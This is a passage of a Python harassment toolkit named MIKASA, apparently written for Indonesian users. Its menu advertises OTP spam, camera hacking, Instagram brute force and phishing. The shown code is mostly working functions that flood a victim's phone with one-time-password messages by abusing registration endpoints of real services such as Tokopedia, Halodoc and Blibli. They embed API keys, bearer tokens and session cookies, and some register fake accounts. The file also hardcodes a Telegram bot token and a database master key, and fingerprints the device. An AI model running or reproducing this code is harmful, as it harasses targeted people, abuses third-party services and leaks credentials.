#!/usr/bin/env python3
# MIKASA v1.0.0

import os
import sys
import time
import re
import json
import requests
import threading
import random
import base64
import uuid
import phonenumbers
import subprocess
import hashlib
import socket
import platform
from phonenumbers import geocoder, carrier, timezone as phone_timezone
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, quote, unquote
from colorama import Fore, Back, init
from fake_useragent import UserAgent

REPO_URL = "https://github.com/Rullzzz-AimGod/Mikasa.git"

def check_update():
    tools_dir = os.path.dirname(os.path.abspath(__file__))
    os.chdir(tools_dir)

    print("[ + ] Tools Mikasa Update [ ! ]")
    print("Mengecek update terbaru...")
    time.sleep(3)
    try:
        subprocess.run(["git", "remote", "set-url", "origin", REPO_URL],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        subprocess.run(["git", "fetch", "origin", "main"],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)

        local = subprocess.check_output(["git", "rev-parse", "main"]).strip()
        remote = subprocess.check_output(["git", "rev-parse", "origin/main"]).strip()

        if local != remote:
            print("[ ! ] Update tersedia! Menarik versi terbaru...")
            time.sleep(2)
            subprocess.run(["git", "pull", "origin", "main"], check=True)
            print("[ + ] Update selesai. Silakan jalankan ulang tools.")
            time.sleep(2)
            sys.exit(0)
        else:
            print("[ + ] Tools sudah versi terbaru.\n")
            time.sleep(2)
    except subprocess.CalledProcessError:
        print("[ ! ] Gagal cek update (tidak ada koneksi / repo error). Lanjut pakai versi lokal.\n")
        time.sleep(2)
    except FileNotFoundError:
        print("[ ! ] Git tidak ditemukan. Pastikan git sudah terinstall.\n")
        time.sleep(2)
#verifikasi

BIN_ID = "6a3d5d48da38895dfefe7001"
API_KEY = "$2a$10$VuBe7/VB/OAKQqxOBxy6luVPEWpfB17TiTeAJft9lNNJR15TSfMeS"
ACCESS_KEY = "MIKASA_UID"
BOT_TOKEN = "8685515038:AAEW_N4J98oYLIMpP71Fc9W99ha7nR4mJAs"
ADMIN_ID = "8873967955"

def get_uid():
    uid_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".device_uid")


    if os.path.exists(uid_file):
        try:
            with open(uid_file, "r") as f:
                saved_uid = f.read().strip()
            if saved_uid:
                return saved_uid
        except:
            pass


    identifiers = []

    try:
        identifiers.append(socket.gethostname())
    except:
        pass

    try:
        mac = subprocess.check_output(
            ['cat', '/sys/class/net/wlan0/address'],
            stderr=subprocess.DEVNULL
        ).decode().strip()
        identifiers.append(mac)
    except:
        pass

    try:
        serial = subprocess.check_output(
            ['getprop', 'ro.serialno'],
            stderr=subprocess.DEVNULL
        ).decode().strip()
        identifiers.append(serial)
    except:
        pass

    identifiers.append(str(uuid.uuid4()))
    raw = ''.join(identifiers)
    new_uid = hashlib.sha256(raw.encode()).hexdigest()[:16]

    try:
        with open(uid_file, "w") as f:
            f.write(new_uid)
    except:
        pass

    return new_uid

def load_database():
    try:
        url = f"https://api.jsonbin.io/v3/b/{BIN_ID}/latest"
        headers = {"X-Master-Key": API_KEY, "X-Access-Key": ACCESS_KEY}
        resp = requests.get(url, headers=headers, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            return data.get("record", {})
        return None
    except:
        return None

def save_database(data):
    try:
        url = f"https://api.jsonbin.io/v3/b/{BIN_ID}"
        headers = {"X-Master-Key": API_KEY, "X-Access-Key": ACCESS_KEY, "Content-Type": "application/json"}
        resp = requests.put(url, json=data, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def cek_uid(uid):
    db = load_database()
    if not db:
        return None, None
    users = db.get("users", [])
    for user in users:
        if user.get("uid") == uid:
            return True, user
    return False, None

def kirim_notif_telegram(uid, username):
    try:
        pesan = f"""
🔑 REGISTRASI UID BARU

🆔 UID: `{uid}`
👤 Username: `{username}`
📱 Device: {platform.system()} {platform.release()}
🕐 Waktu: {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}

Untuk mendaftarkan, tambahkan ke database:
uid: {uid}
nama: {username}
status: active
"""
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": ADMIN_ID, "text": pesan, "parse_mode": "Markdown"}
        requests.post(url, json=payload, timeout=10)
        return True
    except:
        return False

def register_user(uid, username):
    db = load_database()
    if db is None:
        db = {"users": []}
    for user in db.get("users", []):
        if user.get("uid") == uid:
            return False, "UID sudah terdaftar!"
    new_user = {
        "uid": uid,
        "nama": username,
        "status": "pending",
        "registered": datetime.now().isoformat(),
        "expiry": (datetime.now() + timedelta(days=30)).isoformat()
    }
    db["users"].append(new_user)
    if save_database(db):
        kirim_notif_telegram(uid, username)
        return True, "User berhasil didaftarkan! Tunggu aktivasi admin."
    return False, "Gagal menyimpan database!"

def menu_uid():
    os.system('clear')
    uid = get_uid()
    print(f"""
{Y}┌─────────────────────────────────────────────────────────────┐
{Y}│{W}              🔐 SISTEM REGISTRASI UID                 {Y}│
{Y}├─────────────────────────────────────────────────────────────┤
{Y}│{W}  UID Device   : {G}{uid}{W}                           {Y}│
{Y}│{W}  Status       : {R}Belum Terdaftar{W}                 {Y}│
{Y}├─────────────────────────────────────────────────────────────┤
{Y}│{W}  Silakan daftar dengan membuat username               {Y}│
{Y}│{W}  Username harus 3-12 karakter, tanpa spasi            {Y}│
{Y}├─────────────────────────────────────────────────────────────┤
{Y}│{Y}  [1] Daftar UID baru                                  {Y}│
{Y}│{Y}  [2] Coba lagi (refresh)                              {Y}│
{Y}│{Y}  [0] Keluar                                           {Y}│
{Y}└─────────────────────────────────────────────────────────────┘{N}
""")
    pilihan = input(f"{W}└─{R}${N} ").strip()
    if pilihan == "0":
        sys.exit(0)
    elif pilihan == "1":
        print(f"\n{W}Masukkan username (tanpa spasi, 3-12 karakter):{N}")
        username = input(f"{W}└─{R}${N} ").strip()
        if not username or len(username) < 3 or len(username) > 12 or " " in username:
            print(f"{R}❌ Username tidak valid!{N}")
            time.sleep(2)
            return menu_uid()
        success, msg = register_user(uid, username)
        if success:
            print(f"{G}✅ {msg}{N}")
            print(f"{Y}⏳ Tunggu aktivasi dari admin...{N}")
            input(f"{W}Tekan Enter untuk keluar...{N}")
            sys.exit(0)
        else:
            print(f"{R}❌ {msg}{N}")
            time.sleep(2)
            return menu_uid()
    else:
        return menu_uid()


R = '\033[1;31m'
G = '\033[1;32m'
Y = '\033[1;33m'
P = '\033[1;35m'
C = '\033[1;36m'
W = '\033[1;37m'
N = '\033[0m'


stop_animasi = False

def animasi_loading(text="Loading", durasi=2):
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    i = 0
    start = time.time()
    while not stop_animasi and (time.time() - start) < durasi:
        sys.stdout.write(f"\r{R}[{chars[i % len(chars)]}] {W}{text}{N}")
        sys.stdout.flush()
        i += 1
        time.sleep(0.1)
    sys.stdout.write("\r" + " " * 50 + "\r")

def loading_masuk():
    global stop_animasi
    stop_animasi = False
    t = threading.Thread(target=animasi_loading, args=("Memuat MIKASA...", 2))
    t.daemon = True
    t.start()
    time.sleep(2)
    stop_animasi = True
    t.join(timeout=0.5)
    print("\r" + " " * 50 + "\r", end="")


def get_user():
    try:
        return os.popen('whoami').read().strip()
    except:
        return "?"

def get_date():
    return datetime.now().strftime("%d-%m-%Y")

def print_banner(user, date):
    uid = get_uid()
    status, _ = cek_uid(uid)
    status_text = f"{G}ACTIVE{W}" if status else f"{R}PENDING{W}"
    
    print(f"""
{R}╔═╗╔═╦══╦╗╔═╦═══╦═══╦═══╗
{R}║║╚╝║╠╣╠╣║║╔╣╔═╗║╔═╗║╔═╗║
{R}║╔╗╔╗║║║║╚╝╝║║─║║╚══╣║─║║
{R}║║║║║║║║║╔╗║║╚═╝╠══╗║╚═╝║
{R}║║║║║╠╣╠╣║║╚╣╔═╗║╚═╝║╔═╗║
{R}╚╝╚╝╚╩══╩╝╚═╩╝─╚╩═══╩╝─╚╝{N}

{R}─────────────────────────────────────────────────────────────{N}
{R}  {W}UID   : {C}{uid}{N}
{R}  {W}Status: {status_text}{N}
{R}  {W}Author: {G}Rulzz{N}   Tools: {G}15{N}
{R}  {W}Date  : {G}{date}{N}
{R}  {W}Version: {G}1.0.0{N}
{R}─────────────────────────────────────────────────────────────{N}
                           M E N U
{R}─────────────────────────────────────────────────────────────{N}
{R}  {W}01{N} OTP SPAM     {W}02{N} HACK-CAMERA  {W}03{N} OSINT{N}
{R}  {W}04{N} EMAIL SPAM   {W}05{N} DECODER      {W}06{N} ENCRYPTOR{N}
{R}  {W}07{N} IMEI Checker {W}08{N} IP TRACKER   {W}09{N} PORT SCAN{N}
{R}  {W}10{N} BOT TELEGRAM {W}11{N} IG BRUTE     {W}12{N} SPAM NGL{N}
{R}  {W}13{N} Phissing     {W}14{N} PROXY CHECK  {W}15{N} FILE ORGAN{N}
{R}─────────────────────────────────────────────────────────────{N}
{R}  {R}00{N} EXIT{N}
{R}─────────────────────────────────────────────────────────────{N}

{R}┌──({P}{user}{R})-[{Y}~{R}]
└─{R}${N} """, end="")

# ===================== REFRESH DATE =====================
clock_running = True
current_input = ""

def refresh_date():
    global clock_running, current_input
    last_date = ""
    
    while clock_running:
        user = get_user()
        date = get_date()
        
        if date != last_date:
            os.system('clear')
            print_banner(user, date)
            last_date = date
            
            if current_input:
                sys.stdout.write(current_input)
                sys.stdout.flush()
        
        time.sleep(1)


cooldown_otp = 0
cooldown_lock = threading.Lock()
stop_cooldown = False

def spam_otp_adiraku(nomor):
     try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        elif nomor.startswith('0'):
            nomor_lokal = nomor
        else:
            nomor_lokal = '0' + nomor

        url = 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata'
        headers = {
            'Content-Type': 'application/json; charset=utf-8'
        }
        payload = {
            'mobileNumber': nomor_lokal,
            'type': 'prospect-create',
            'channel': 'whatsapp'
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400

     except Exception as e:
        return False
    
def spam_otp_tokopedia(nomor):
      try:
        session = requests.Session()
        url_token = f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={nomor}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        resp = session.get(url_token, headers=headers, timeout=10)
        token = re.search(r'<input\s+id="Token"\s+value="([^"]+)"', resp.text)
        if not token:
            return False
        url_otp = "https://accounts.tokopedia.com/otp/c/ajax/request-wa"
        data = {
            "otp_type": "116",
            "msisdn": nomor,
            "tk": token.group(1),
            "email": "",
            "original_param": "",
            "user_id": "",
            "signature": "",
            "number_otp_digit": "6"
        }
        headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
        headers["X-Requested-With"] = "XMLHttpRequest"
        resp2 = session.post(url_otp, data=data, headers=headers, timeout=10)
        return resp2.status_code == 200
      except:
        return False
    
def spam_otp_singa(nomor):
     try:
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[1:]
        elif not nomor.startswith('62'):
            nomor = '62' + nomor

        url = 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id='
        headers = {
            'Content-Type': 'application/json; charset=utf-8',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }
        payload = {
            'mobile_phone': nomor,
            'type': 'mobile',
            'is_switchable': 1
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200

     except Exception as e:
        return False
    
def spam_otp_pinhome(nomor):
        try:
            if nomor.startswith("62"):
                nomor_lokal = "0" + nomor[2:]
            else:
                nomor_lokal = nomor
            url = "https://www.pinhome.id/api/pinaccount/request/otp"
            headers = {
                "Host": "www.pinhome.id",
                "Accept": "application/json",
                "Authorization": "Bearer 13d2886acc908192d0c33325b44a617e5e3395481cc03cbfd67de34886399731",
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10)",
                "Origin": "https://www.pinhome.id"
            }
            payload = {
                "accountType": "customers",
                "countryCode": "62",
                "medium": "whatsapp",
                "otpType": "register",
                "phoneNumber": nomor_lokal
            }
            resp = requests.post(url, json=payload, headers=headers, timeout=10)
            return resp.status_code < 400
        except:
            return False
    
def spam_otp_duniagames(nomor):
        try:
            phone = nomor
            if nomor.startswith("0"):
                username = nomor
            else:
                username = "0" + nomor[2:] if nomor.startswith("62") else nomor
            session = requests.Session()
            url = "https://api.duniagames.co.id/api/user/api/v2/user/send-otp"
            headers = {
                "accept": "application/json, text/plain, */*",
                "accept-language": "id",
                "ciam-type": "FR",
                "content-type": "application/json",
                "origin": "https://duniagames.co.id",
                "referer": "https://duniagames.co.id/",
                "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36",
                "x-device": "1ee352b7-d541-418f-a7b9-82d9358ea6a4"
            }
            payload = {"phoneNumber": phone, "userName": username}
            resp = session.post(url, json=payload, headers=headers, timeout=10)
            return resp.status_code == 200
        except:
            return False
    
def spam_otp_acc(nomor):
        try:
            if nomor.startswith("62"):
                nomor_lokal = "0" + nomor[2:]
            else:
                nomor_lokal = nomor
            session = requests.Session()
            url = "https://www.acc.co.id/register/new-account"
            headers = {
                "Accept": "text/x-component",
                "Content-Type": "text/plain;charset=UTF-8",
                "Host": "www.acc.co.id",
                "next-action": "7f4271400eb36624563cc4172891e0c821039f2fca",
                "next-router-state-tree": "%5B%22%22%2C%7B%22children%22%3A%5B%22(auth)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22new-account%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%5D%7D%5D%7D%5D%2Cnull%2Cnull%5D%7D%5D%2Cnull%2Cnull%5D%2Cnull%2Ctrue%5D",
                "Origin": "https://www.acc.co.id",
                "Referer": "https://www.acc.co.id/register/new-account",
                "User-Agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36"
            }
            payload = f'[{{"user_id":null,"action":"register","send_to":"{nomor_lokal}","provider":"whatsapp"}}]'
            resp = session.post(url, data=payload, headers=headers, timeout=10)
            return resp.status_code == 200
        except:
            return False
   
def spam_otp_absenku(nomor):
      try:
        if nomor.startswith("62"):
            nomor = "0" + nomor[2:]

        session = requests.Session()

        session.get(
            "https://registrasi.absenku.com/index.php/register/index/2",
            headers={
                "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            },
            timeout=10
        )

        headers = {
            "accept": "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded",
            "referer": "https://registrasi.absenku.com/index.php/register/index/2",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
        }

        session.post(
            "https://registrasi.absenku.com/index.php/register/validasi_trial",
            data={
                "nama": "Nama Lengkap",
                "email": "email@gmail.com",
                "telp": nomor,
                "company_name": "PT Test",
                "jumlah": "10",
                "tujuan": "1",
                "paket": "21",
                "ci_csrf_token": ""
            },
            headers=headers,
            timeout=10
        )

        resp = session.get(
            "https://registrasi.absenku.com/index.php/register/ajax_detik_otp",
            params={"telp": nomor},
            headers=headers,
            timeout=10
        )

        return resp.status_code < 400
      except:
        return False
    
def spam_otp_saturdays(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor[2:]
        else:
            nomor_lokal = nomor
        
        session = requests.Session()
        url = "https://beta.api.saturdays.com/api/v1/user/otp/send"
        
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
            'Accept-Encoding': "gzip, deflate, br",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': '"Android"',
            'authorization': "undefined",
            'device-type': "mweb",
            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'x-api-key': "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj",
            'sec-ch-ua-mobile': "?1",
            'country-code': "ID",
            'currency-code': "IDR",
            'platform': "mweb",
            'origin': "https://saturdays.com",
            'sec-fetch-site': "same-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://saturdays.com/",
            'accept-language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            'priority': "u=1, i"
        }
        
        payload = {
            "number": nomor_lokal,
            "country_code": "+62",
            "type": "WHATSAPP"
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False
    
def spam_otp_maulagi(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor[2:]
        else:
            nomor_lokal = nomor
        
        session = requests.Session()
        url = "https://api.maulagi.id/api/v2/auth/check"
        
        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://maulagi.id',
            'x-ml-key': 'C59RUHBU59',
            'Accept': 'application/json, text/plain, */*',
            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-mobile': '?1',
            'Referer': 'https://maulagi.id/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }
        
        payload = {"credentials": nomor_lokal}
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False

def spam_otp_bliblitiket(nomor):
     try:
        if nomor.startswith("0"):
            nomor = "62" + nomor[1:]  
        elif nomor.startswith("62"):
            nomor = nomor              
        else:
            nomor_lokal = "62" + nomor 
        
        session = requests.Session()
        url = "https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/otp/generate"
        
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
            'Accept-Encoding': "gzip, deflate, br",
            'x-request-id': "94b38767-7013-4b97-8315-fa99f54bb2d6",
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'x-channel-id': "MWEB",
            'sec-ch-ua-mobile': "?1",
            'x-lang': "id",
            'x-entity': "BLIBLI",
            'content-type': "text/plain;charset=UTF-8",
            'x-client-id': "3ca1ed67701249861819ba4850f4f135",
            'origin': "https://account.bliblitiket.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://account.bliblitiket.com/register?ref=https%3A%2F%2Fwww.blibli.com%2Fbackend%2Fcommon%2Fsso-login%3Fref%3DL2FjY291bnQ%3D%26isExternal%3Dtrue&client_id=3ca1ed67701249861819ba4850f4f135",
            'accept-language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            'priority': "u=1, i",
            'Cookie': "userlang=id; unm_cc=ID; entity=blibli; searchParamsBeforeRedirect=%3Fref%3Dhttps%253A%252F%252Fwww.blibli.com%252Fbackend%252Fcommon%252Fsso-login%253Fref%253DL2FjY291bnQ%253D%2526isExternal%253Dtrue"
        }
        
        payload = {
            "action": "REGISTER_OTP",
            "channel": "WHATS_APP",
            "recipient": f"+{nomor}",
            "recaptchaToken": ""
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False       
     
def spam_otp_matahari(nomor):
      try:
        if nomor.startswith("0"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor[2:]
        else:
            nomor_lokal = nomor              
        
        import random
        import string
        random_email = f"user{random.randint(100000,999999)}@gmail.com"
        random_name = f"User{random.randint(100,999)}"
        random_password = ''.join(random.choices(string.ascii_letters + string.digits + "._", k=16))
        
        session = requests.Session()
        url = "https://matahari-backend-prod.matahari.com/api/auth/register"
        
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
            'Accept-Encoding': "gzip, deflate, br",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'sec-ch-ua-mobile': "?1",
            'Origin': "https://matahari.com",
            'Sec-Fetch-Site': "same-site",
            'Sec-Fetch-Mode': "cors",
            'Sec-Fetch-Dest': "empty",
            'Referer': "https://matahari.com/",
            'Accept-Language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
        }
        
        payload = {
            "emailAddress": random_email,
            "name": random_name,
            "mobileCountryCode": "",
            "mobileNumber": nomor_lokal,
            "birthDate": "2000-01-01",
            "genderId": "1",
            "password": random_password,
            "cardNumber": "",
            "referralCode": "",
            "salesmanId": "",
            "pickupStoreCode": "",
            "marketingCode": ""
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
      except:
        return False

def spam_otp_rumah123(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = "62" + nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor
        else:
            nomor_lokal = "62" + nomor
        
        session = requests.Session()
        url = "https://www.rumah123.com/api/otp/request-otp"
        
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip, deflate, br",
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'content-type': "application/json;charset=UTF-8",
            'sec-ch-ua-mobile': "?1",
            'base-url-core': "https://www.rumah123.com",
            'origin': "https://www.rumah123.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.rumah123.com/user/login?redirect=https://www.rumah123.com/",
            'accept-language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            'priority': "u=1, i",
            'Cookie': "ajs_anonymous_id=962b0766-64e4-493c-ae48-e59524822742; _ga=GA1.1.533350590.1780038198; _fbp=fb.1.1780038199360.807614422108834462; _tt_enable_cookie=1; _ttp=01KSS8PT9AQ=2N85JA4NBZ289F_.tt.1; __gads=ID=6ca90e1a33b998e9:T=1780045927:RT=1780045927:S=ALNI_Mb48=zdld8fUzNTj2mKtzcuQteMfQ; __gpi=UID=000014381fc3b087:T=1780045927:RT=1780045927:S=ALNI_MbWUjDmbUHcU-lmpT4CdYzH88d6yw; __eoi=ID=c85668bfa6f5416c:T=1780045927:RT=1780045927:S=AA-AfjZDUEoWxpdAvxXN4ehDANSQ; enquiry_data={\"email\":\"Jokowi@gmail.com\",\"isEverTickMortgage\":false,\"isVerified\":false,\"name\":\"Bray\",\"otpExpiredTime\":1780046220580,\"phoneNumber\":\"6285757102633\",\"requestOTPTime\":1780048557646}; 99group=s%3Accfa8db0-50f5-4e86-8aeb-35622f2b2cc0.G%2FYccepBgrnc6CJZvAPejEIwPe0jzpnoIjF3bvdL35s; _cfuvid=JIxmpGlboMHKgIlCU_H9Oc5=kw9ZYv9H8Mgr0B2FOec-1780182128.8329046-1.0.1.1-hIBwtBRvNB1Bv5_PsQGgwwAgoLU8KCBhSa6g9Abs9.Q; _clck=1n8grzt%5E2%5Eg6h%5E0%5E2340; flag_data={\"showAppsDownloadBanner\":true}; FCCDCF=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5B32%2C%22%5B%5C%22e1507b7e-d15b-40ef-b408-d0cc88941c59%5C%22%2C%5B1780038190%2C882000000%5D%5D%22%5D%5D%5D; segment-utm=eyJpdG1fbWkaX=tIjoiIiwiaXRtX3NvdXJjZSI6IiIsInBhZ2=fcm=mZXJyZXIiOiJodHRwczovL3d3dy5nb29nbGUuY29tLyIsInNlc3Npb25fY291bnQiOjMsInNlc3Npb25fcm=mZXJyZXIiOjE3ODAxODIxMzE0MTIsInRpbW=zdGFtcCI6MTc4MDE4MjE3MDg0OSwidXRtX2NhbXBhaWduIjoiIiwidXRtX21lZGl1bSI6IiIsIn=0b=9zb3=yY2UiOiIifQzz; FCNEC=%5B%5B%22AKsRol-ufo=7rjU2mcoI=kLK9e4X2SajLpPwjup6Os7MDD0gzmh_Cgps6b5CUxPAUD9eSXrKUE0ClyvIK2CkIZkYxujk5vOnGmDR050J8xB26-Hqp6hvMh1wYxihBBen1G3_ysUKac0FyaTTkRoQ-ZefR2bi6ko8TA%3D%3D%22%5D%5D; _ga_D5=06TRY2RzGS2.1.s1780182173$o4$g0$t1780182173$j60$l0$h0; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22WHnraPibWLKLluimE5Gw%22%2C%22expiryDate%22%3A%222027-05-30T23%3A02%3A54.553Z%22%7D; ttcsid=1780182175610::ron=FY0wjKCEa72LL2gJ.4.1780182182816.0::1.-37243.0::7090.2.285.885::0.0.0; ttcsid_C2OBT2A3E7AM6FQ8BMMG=1780182175601::NBtm-TUK-lurT5Q-Kl19.4.1780182182817.0; _ga_Z36X54E7Z5=GS2.1.s1780182173$o4$g0$t1780182182$j51$l0$h0; _gcl_au=1.1.950890321.1780038193.1925756783.1780182179.1780182183"
        }
        
        payload = {
            "ipAddress": f"140.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "phoneNumber": nomor_lokal,
            "portalId": 1,
            "type": "WHATSAPP",
            "url": "https://www.rumah123.com/user/login?redirect=https://www.rumah123.com/"
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False
       
def spam_otp_halodoc(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = "62" + nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor
        else:
            nomor_lokal = "62" + nomor
        
        session = requests.Session()
        url = "https://customers.api.halodoc.com/magneto-api/v2/users/authentication/otp/requests"
        
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip, deflate, br",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': '"Android"',
            'X-XSRF-TOKEN': "E581E099A363DC049909F3AACDCEA6248D995C45F4A53111BDA0A626487D025AD83FD42B99E0FFA4CF48A9663628E322BEE9",
            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'sec-ch-ua-mobile': "?1",
            'Origin': "https://www.halodoc.com",
            'Sec-Fetch-Site': "same-site",
            'Sec-Fetch-Mode': "cors",
            'Sec-Fetch-Dest': "empty",
            'Referer': "https://www.halodoc.com/",
            'Accept-Language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            'Cookie': "rx=isitorrwlrur9lz1780208322401=UP888O9A=FOLNR8R0HR3389UTPU62HD; dtSarwlrur9lz-; _gcl_au=1.1.1758244023.1780208325; _ga=GA1.1.51880007.1780208328; rxvtrwlrur9lz1780210130688|1780208322422; dtPCrwlrur9lz5$8322365_313h32vHSWFLANATLPCNEMPCUQHAFKRGRTPDUTW-0e0; dtCookierwlrur9lzv_4_srv_5_sn_85FE102AE029FEC31922E56941139E18_app-3Ae28137e9070184e7_0_app-3Aea7c4b59f27d43eb_0_ol_0_perc_100000_mul_1_rcs-3Acss_0; afUserId=69040147-6a0d-47d5-8454-8d920230c2f0-p; AF_SYNC=1780208331597; WZRK_Gz=f8f4004de684498e9aea0d16dcfc99d4; WZRK_S_WR9-ZRZ-9W7Z=%7B%22p%22%3A1%2C%22s%22%3A1780208334%2C%22t%22%3A1780208334%7D; _ga_02NBJNEK=HGS2.1.s1780208328$o1$g0$t1780208338$j50$l0$h0; XSRF-TOKEN=E581E099A363DC049909F3AACDCEA6248D995C45F4A53111BDA0A626487D025AD83FD42B99E0FFA4CF48A9663628E322BEE9"
        }
        
        payload = {
            "phone_number": f"+{nomor_lokal}",
            "channel": "whatsapp",
            "otp_resent": False,
            "clientId": "4dccb45a031542ad01fd22931238c909"
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False
        
def spam_otp_misteraladin(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor[2:]
        else:
            nomor_lokal = nomor
        
        session = requests.Session()
        url = "https://m.misteraladin.com/api/members/v2/otp/request"
        
        headers = {
